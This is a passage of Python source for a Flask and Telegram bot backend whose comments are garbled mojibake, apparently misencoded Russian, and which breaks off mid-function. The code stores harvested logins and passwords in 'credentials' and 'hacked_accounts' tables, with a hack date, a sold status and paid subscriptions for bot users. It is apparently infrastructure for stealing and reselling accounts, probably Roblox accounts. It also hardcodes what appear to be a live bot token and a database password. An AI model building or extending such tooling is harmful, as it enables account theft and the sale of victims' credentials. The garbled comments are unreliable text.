from flask import Flask, request, render_template, redirect, url_for
import telebot
from telebot import types
import psycopg2
import os
import requests
import threading
import time
from datetime import datetime, timedelta

# === –û—Å–Ω–æ–≤–Ω—ã–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –±–æ—Ç–∞ ===
TOKEN = '8028944732:AAEICb55rLpVYfL9vDul5aYPf_E19SPjMlo'  # –¢–æ–∫–µ–Ω –±–æ—Ç–∞ –æ—Ç BotFather
ADMIN_CHAT_ID = '6956377285'  # Chat ID —Å–æ–∑–¥–∞—Ç–µ–ª—è –±–æ—Ç–∞
DATABASE_URL = 'postgresql://roblox_db_user:vjBfo3Vwigs5pnm107BhEkXe6AOy3FWF@dpg-cvr25cngi27c738j8c50-a.oregon-postgres.render.com/roblox_db'  # URL –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö
SITE_URL = os.getenv('SITE_URL', 'https://tg-bod.onrender.com')  # URL —Å–∞–π—Ç–∞, –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é Render

# === –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Flask –∏ Telebot ===
app = Flask(__name__)  # –°–æ–∑–¥–∞–µ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ Flask –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –≤–µ–±—Ö—É–∫–æ–≤
bot = telebot.TeleBot(TOKEN)  # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º –±–æ—Ç–∞ —Å —Ç–æ–∫–µ–Ω–æ–º

# === –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è —Å–æ—Å—Ç–æ—è–Ω–∏—è –±–æ—Ç–∞ ===
tech_break = None  # –í—Ä–µ–º—è –æ–∫–æ–Ω—á–∞–Ω–∏—è —Ç–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤–∞
tech_reason = None  # –ü—Ä–∏—á–∏–Ω–∞ —Ç–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤–∞
processed_updates = set()  # –ú–Ω–æ–∂–µ—Å—Ç–≤–æ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã—Ö update_id –¥–ª—è –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è –¥—É–±–ª–∏–∫–∞—Ç–æ–≤
pending_hacked = {}  # –°–ª–æ–≤–∞—Ä—å –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤ hacked
pending_support = {}  # –°–ª–æ–≤–∞—Ä—å –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π –≤ support

# === –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ç–µ–∫—É—â–µ–≥–æ –≤—Ä–µ–º–µ–Ω–∏ —Å —É—á–µ—Ç–æ–º —á–∞—Å–æ–≤–æ–≥–æ –ø–æ—è—Å–∞ ===
def get_current_time():
    print("–ü–æ–ª—É—á–µ–Ω–∏–µ —Ç–µ–∫—É—â–µ–≥–æ –≤—Ä–µ–º–µ–Ω–∏ —Å —É—á–µ—Ç–æ–º UTC+2")
    current_time = datetime.now()  # –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â–µ–µ –≤—Ä–µ–º—è –≤ UTC
    adjusted_time = current_time + timedelta(hours=2)  # –î–æ–±–∞–≤–ª—è–µ–º 2 —á–∞—Å–∞ –¥–ª—è UTC+2
    print(f"–¢–µ–∫—É—â–µ–µ –≤—Ä–µ–º—è: {adjusted_time}")
    return adjusted_time

# === –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö ===
def get_db_connection():
    print("–ü–æ–ø—ã—Ç–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö")
    try:
        conn = psycopg2.connect(DATABASE_URL)  # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —Å –±–∞–∑–æ–π
        print("–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –ë–î —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ")
        return conn
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î: {e}")
        return None

# === –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö ===
def init_db():
    print("–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö")
    conn = get_db_connection()  # –ü–æ–ª—É—á–∞–µ–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ
    if conn is None:
        print("–ù–µ —É–¥–∞–ª–æ—Å—å –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å –ë–î - –ø—Ä–æ–¥–æ–ª–∂–∞–µ–º –±–µ–∑ –ë–î")
        return False
    try:
        c = conn.cursor()  # –°–æ–∑–¥–∞–µ–º –∫—É—Ä—Å–æ—Ä –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∑–∞–ø—Ä–æ—Å–æ–≤
        print("–°–æ–∑–¥–∞–µ–º —Ç–∞–±–ª–∏—Ü—É 'users', –µ—Å–ª–∏ –æ–Ω–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç")
        c.execute('''CREATE TABLE IF NOT EXISTS users 
                     (chat_id TEXT PRIMARY KEY, prefix TEXT, subscription_end TEXT, site_clicks INTEGER DEFAULT 0, password_views INTEGER DEFAULT 0)''')
        print("–°–æ–∑–¥–∞–µ–º —Ç–∞–±–ª–∏—Ü—É 'credentials', –µ—Å–ª–∏ –æ–Ω–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç")
        c.execute('''CREATE TABLE IF NOT EXISTS credentials 
                     (login TEXT PRIMARY KEY, password TEXT, added_time TEXT)''')
        print("–°–æ–∑–¥–∞–µ–º —Ç–∞–±–ª–∏—Ü—É 'hacked_accounts', –µ—Å–ª–∏ –æ–Ω–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç")
        c.execute('''CREATE TABLE IF NOT EXISTS hacked_accounts 
                     (login TEXT PRIMARY KEY, password TEXT, hack_date TEXT, prefix TEXT, sold_status TEXT, linked_chat_id TEXT)''')
        subscription_end = (get_current_time() + timedelta(days=3650)).isoformat()  # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø–æ–¥–ø–∏—Å–∫—É –Ω–∞ 10 –ª–µ—Ç –¥–ª—è —Å–æ–∑–¥–∞—Ç–µ–ª—è
        print(f"–£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–æ–∑–¥–∞—Ç–µ–ª—è –¥–ª—è chat_id: {ADMIN_CHAT_ID}")
        c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
                  "ON CONFLICT (chat_id) DO UPDATE SET prefix = EXCLUDED.prefix, subscription_end = EXCLUDED.subscription_end",
                  (ADMIN_CHAT_ID, "–°–æ–∑–¥–∞—Ç–µ–ª—å", subscription_end))
        conn.commit()  # –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è
        print("–ö–æ–º–º–∏—Ç –∏–∑–º–µ–Ω–µ–Ω–∏–π –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö")
        conn.close()  # –ó–∞–∫—Ä—ã–≤–∞–µ–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ
        print("–ë–î —É—Å–ø–µ—à–Ω–æ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–∞")
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –ë–î: {e}")
        conn.close()
        return False

# === –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–¥–¥–µ—Ä–∂–∞–Ω–∏—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ –Ω–∞ Render ===
def keep_alive():
    print("–ó–∞–ø—É—Å–∫ —Ñ—É–Ω–∫—Ü–∏–∏ keep_alive –¥–ª—è –ø–æ–¥–¥–µ—Ä–∂–∞–Ω–∏—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏")
    while True:
        try:
            print(f"–û—Ç–ø—Ä–∞–≤–∫–∞ GET-–∑–∞–ø—Ä–æ—Å–∞ –Ω–∞ {SITE_URL}")
            response = requests.get(SITE_URL)  # –ü–∏–Ω–≥—É–µ–º —Å–∞–π—Ç
            print(f"üîÅ –ü–∏–Ω–≥: {response.status_code} - {response.text[:50]}")
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ keep-alive: {e}")
        time.sleep(60)  # –ñ–¥–µ–º 60 —Å–µ–∫—É–Ω–¥ –ø–µ—Ä–µ–¥ —Å–ª–µ–¥—É—é—â–∏–º –ø–∏–Ω–≥–æ–º

# === –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ –ë–î ===
def get_user(chat_id):
    print(f"–ü–æ–ª—É—á–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è chat_id: {chat_id}")
    conn = get_db_connection()
    if conn is None:
        print(f"–ù–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î –¥–ª—è chat_id: {chat_id}")
        if chat_id == ADMIN_CHAT_ID:
            print(f"–ñ–µ—Å—Ç–∫–æ –∑–∞–¥–∞–µ–º —Å–æ–∑–¥–∞—Ç–µ–ª—è –¥–ª—è {chat_id}")
            return {
                'prefix': '–°–æ–∑–¥–∞—Ç–µ–ª—å',
                'subscription_end': get_current_time() + timedelta(days=3650),
                'site_clicks': 0,
                'password_views': 0
            }
        return None
    try:
        c = conn.cursor()
        print(f"–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∑–∞–ø—Ä–æ—Å–∞ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {chat_id}")
        c.execute("SELECT prefix, subscription_end, site_clicks, password_views FROM users WHERE chat_id = %s", (chat_id,))
        result = c.fetchone()
        conn.close()
        if result:
            print(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {chat_id} –Ω–∞–π–¥–µ–Ω: {result}")
            user_data = {
                'prefix': result[0],
                'subscription_end': datetime.fromisoformat(result[1]) if result[1] else None,
                'site_clicks': result[2],
                'password_views': result[3]
            }
            return user_data
        print(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {chat_id} –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –±–∞–∑–µ")
        return None
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ get_user –¥–ª—è {chat_id}: {e}")
        conn.close()
        return None

# === –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ –ë–î ===
def save_user(chat_id, prefix, subscription_end=None):
    print(f"–°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {chat_id} —Å –ø—Ä–µ—Ñ–∏–∫—Å–æ–º {prefix}")
    conn = get_db_connection()
    if conn is None:
        print(f"–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {chat_id}: –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î")
        return
    try:
        c = conn.cursor()
        if subscription_end is None:
            subscription_end = get_current_time().isoformat()
            print(f"–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –≤—Ä–µ–º–µ–Ω–∏ –ø–æ–¥–ø–∏—Å–∫–∏ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é: {subscription_end}")
        print(f"–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ SQL-–∑–∞–ø—Ä–æ—Å–∞ –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {chat_id}")
        c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
                  "ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
                  (chat_id, prefix, subscription_end, prefix, subscription_end))
        conn.commit()
        print(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {chat_id} —É—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω")
        conn.close()
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {chat_id}: {e}")
        conn.close()

# === –§—É–Ω–∫—Ü–∏—è –¥–ª—è —É–≤–µ–ª–∏—á–µ–Ω–∏—è —Å—á–µ—Ç—á–∏–∫–∞ –∫–ª–∏–∫–æ–≤ –Ω–∞ —Å–∞–π—Ç ===
def increment_site_clicks(chat_id):
    print(f"–£–≤–µ–ª–∏—á–µ–Ω–∏–µ —Å—á–µ—Ç—á–∏–∫–∞ –∫–ª–∏–∫–æ–≤ –Ω–∞ —Å–∞–π—Ç –¥–ª—è {chat_id}")
    conn = get_db_connection()
    if conn is None:
        print(f"–ù–µ —É–¥–∞–ª–æ—Å—å –æ–±–Ω–æ–≤–∏—Ç—å –∫–ª–∏–∫–∏ –¥–ª—è {chat_id}: –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î")
        return
    try:
        c = conn.cursor()
        print(f"–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ SQL-–∑–∞–ø—Ä–æ—Å–∞ –¥–ª—è —É–≤–µ–ª–∏—á–µ–Ω–∏—è site_clicks –¥–ª—è {chat_id}")
        c.execute("UPDATE users SET site_clicks = site_clicks + 1 WHERE chat_id = %s", (chat_id,))
        conn.commit()
        print(f"–°—á–µ—Ç—á–∏–∫ –∫–ª–∏–∫–æ–≤ —É–≤–µ–ª–∏—á–µ–Ω –¥–ª—è {chat_id}")
        conn.close()
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —É–≤–µ–ª–∏—á–µ–Ω–∏—è –∫–ª–∏–∫–æ–≤ –¥–ª—è {chat_id}: {e}")
        conn.close()

# === –§—É–Ω–∫—Ü–∏—è –¥–ª—è —É–≤–µ–ª–∏—á–µ–Ω–∏—è —Å—á–µ—Ç—á–∏–∫–∞ –ø—Ä–æ—Å–º–æ—Ç—Ä–æ–≤ –ø–∞—Ä–æ–ª–µ–π ===
def increment_password_views(chat_id):
    print(f"–£–≤–µ–ª–∏—á–µ–Ω–∏–µ —Å—á–µ—Ç—á–∏–∫–∞ –ø—Ä–æ—Å–º–æ—Ç—Ä–æ–≤ –ø–∞—Ä–æ–ª–µ–π –¥–ª—è {chat_id}")
    conn = get_db_connection()
    if conn is None:
        print(f"–ù–µ —É–¥–∞–ª–æ—Å—å –æ–±–Ω–æ–≤–∏—Ç—å –ø—Ä–æ—Å–º–æ—Ç—Ä—ã –ø–∞—Ä–æ–ª–µ–π –¥–ª—è {chat_id}: –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î")
        return
    try:
        c = conn.cursor()
        print(f"–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ SQL-–∑–∞–ø—Ä–æ—Å–∞ –¥–ª—è —É–≤–µ–ª–∏—á–µ–Ω–∏—è password_views –¥–ª—è {chat_id}")
        c.execute("UPDATE users SET password_views = password_views + 1 WHERE chat_id = %s", (chat_id,))
        conn.commit()
        print(f"–°—á–µ—Ç—á–∏–∫ –ø—Ä–æ—Å–º–æ—Ç—Ä–æ–≤ –ø–∞—Ä–æ–ª–µ–π —É–≤–µ–ª–∏—á–µ–Ω –¥–ª—è {chat_id}")
        conn.close()
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —É–≤–µ–ª–∏—á–µ–Ω–∏—è –ø—Ä–æ—Å–º–æ—Ç—Ä–æ–≤ –ø–∞—Ä–æ–ª–µ–π –¥–ª—è {chat_id}: {e}")
        conn.close()

# === –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö ===
def save_credentials(login, password):
    print(f"–°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö: login={login}, password={password}")
    conn = get_db_connection()
    if conn is None:
        print("–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ: –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î")
        return False
    try:
        c = conn.cursor()
        added_time = get_current_time().isoformat()
        print(f"–í—Ä–µ–º—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö: {added_time}")
        c.execute("INSERT INTO credentials (login, password, added_time) VALUES (%s, %s, %s) "
                  "ON CONFLICT (login) DO UPDATE SET password = %s, added_time = %s",
                  (login, password, added_time, password, added_time))
        conn.commit()
        print(f"–£—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã: login={login}")
        conn.close()
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö: {e}")
        conn.close()
        return False

# === –§—É–Ω–∫—Ü–∏—è –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö ===
def delete_credentials(login):
    print(f"–£–¥–∞–ª–µ–Ω–∏–µ —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –¥–ª—è login: {login}")
    conn = get_db_connection()
    if conn is None:
        print("–ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ: –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î")
        return False
    try:
        c = conn.cursor()
        print(f"–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ SQL-–∑–∞–ø—Ä–æ—Å–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è login: {login}")
        c.execute("DELETE FROM credentials WHERE login = %s", (login,))
        conn.commit()
        print(f"–£—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω—ã: login={login}")
        conn.close()
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö: {e}")
        conn.close()
        return False

# === –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –≤–∑–ª–æ–º–∞–Ω–Ω–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞ ===
def save_hacked_account(login, password, prefix, sold_status, linked_chat_id):
    print(f"–°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –≤–∑–ª–æ–º–∞–Ω–Ω–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞: login={login}")
    conn = get_db_connection()
    if conn is None:
        print("–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –≤–∑–ª–æ–º–∞–Ω–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç: –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î")
        return False
    try:
        c = conn.cursor()
        hack_date = get_current_time().isoformat()
        print(f"–î–∞—Ç–∞ –≤–∑–ª–æ–º–∞: {hack_date}")
        c.execute("INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id) "
                  "VALUES (%s, %s, %s, %s, %s, %s) "
                  "ON CONFLICT (login) DO UPDATE SET password = %s, hack_date = %s, prefix = %s, sold_status = %s, linked_chat_id = %s",
                  (login, password, hack_date, prefix, sold_status, linked_chat_id,
                   password, hack_date, prefix, sold_status, linked_chat_id))
        conn.commit()
        print(f"–í–∑–ª–æ–º–∞–Ω–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω: login={login}, sold_status={sold_status}")
        conn.close()
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –≤–∑–ª–æ–º–∞–Ω–Ω–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞: {e}")
        conn.close()
        return False

# === –§—É–Ω–∫—Ü–∏—è –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –≤–∑–ª–æ–º–∞–Ω–Ω–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞ ===
def delete_hacked_account(login):
    print(f"–£–¥–∞–ª–µ–Ω–∏–µ –≤–∑–ª–æ–º–∞–Ω–Ω–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞ –¥–ª—è login: {login}")
    conn = get_db_connection()
    if conn is None:
        print("–ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å –≤–∑–ª–æ–º–∞–Ω–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç: –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î")
        return False
    try:
        c = conn.cursor()
        print(f"–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ SQL-–∑–∞–ø—Ä–æ—Å–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è login: {login}")
        c.execute("DELETE FROM hacked_accounts WHERE login = %s", (login,))
        conn.commit()
        print(f"–í–∑–ª–æ–º–∞–Ω–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω: login={login}")
        conn.close()
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è –≤–∑–ª–æ–º–∞–Ω–Ω–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞: {e}")
        conn.close()
        return False

# === –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö ===
def get_credentials():
    print("–ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö")
    conn = get_db_connection()
    if conn is None:
        print("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ: –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î")
        return []
    try:
        c = conn.cursor()
        print("–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ SQL-–∑–∞–ø—Ä–æ—Å–∞ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö")
        c.execute("SELECT login, password, added_time FROM credentials")
        result = c.fetchall()
        conn.close()
        print(f"–£—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—É—á–µ–Ω—ã: {result}")
        return result
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö: {e}")
        conn.close()
        return []

# === –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤ ===
def get_hacked_accounts():
    print("–ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤")
    conn = get_db_connection()
    if conn is None:
        print("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –≤–∑–ª–æ–º–∞–Ω–Ω—ã–µ –∞–∫–∫–∞—É–Ω—Ç—ã: –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î")
        return []
    try:
        c = conn.cursor()
        print("–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ SQL-–∑–∞–ø—Ä–æ—Å–∞ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤")
        c.execute("SELECT login, password, hack_date, prefix, sold_status, linked_chat_id FROM hacked_accounts")
        result = c.fetchall()
        conn.close()
        print(f"–í–∑–ª–æ–º–∞–Ω–Ω—ã–µ –∞–∫–∫–∞—É–Ω—Ç—ã –ø–æ–ª—É—á–µ–Ω—ã: {result}")
        return result
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤: {e}")
        conn.close()
        return []

# === –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π ===
def get_all_users():
    print("–ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π")
    conn = get_db_connection()
    if conn is None:
        print("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î")
        return []
    try:
        c = conn.cursor()
        print("–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ SQL-–∑–∞–ø—Ä–æ—Å–∞ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π")
        c.execute("SELECT chat_id, prefix, subscription_end, site_clicks, password_views FROM users")
        result = c.fetchall()
        conn.close()
        print(f"–í—Å–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –ø–æ–ª—É—á–µ–Ω—ã: {result}")
        return result
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: {e}")
        conn.close()
        return []

# === –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –≤—Ä–µ–º–µ–Ω–∏ —Å –º–∏–Ω—É—Ç–∞–º–∏ ===
def format_time_with_minutes(iso_time):
